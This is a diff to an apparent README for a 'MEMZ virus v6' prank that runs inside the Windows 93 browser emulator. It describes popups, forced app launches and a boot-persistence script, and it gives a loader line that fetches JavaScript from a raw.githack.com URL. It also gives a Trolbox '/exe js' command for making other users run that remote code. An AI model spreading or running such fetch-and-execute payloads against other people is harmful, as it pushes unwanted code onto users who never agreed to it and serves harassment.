@@ -19,7 +19,7 @@ The virus will make popups on your screen to annoy you including 2 other popups 
 The virus will open win 93 apps incuding Hydra.exe, and will also infect your boot with a js file that loads itself whenever you boot up. 
 -->code($loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js"))
 
-There is another feature which defines that this is a virus. You can make others get it on their pc using the win 93 app, Trolbox.
+There is another feature which defines that this is a virus. You can make others get it on their emulator using the win 93 app, Trolbox.
 In trolbox u need to type in the command  /exe js https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js
 
 The /exe command in trolbox is the executing command that will allow others to execute whatever you put after the exe.
@@ -30,6 +30,6 @@ it will load the raw code.
 
 I used https://raw.githack.com/ to make the code in this git be in a raw form.
 
-
+____________________________________________________________________
 
 
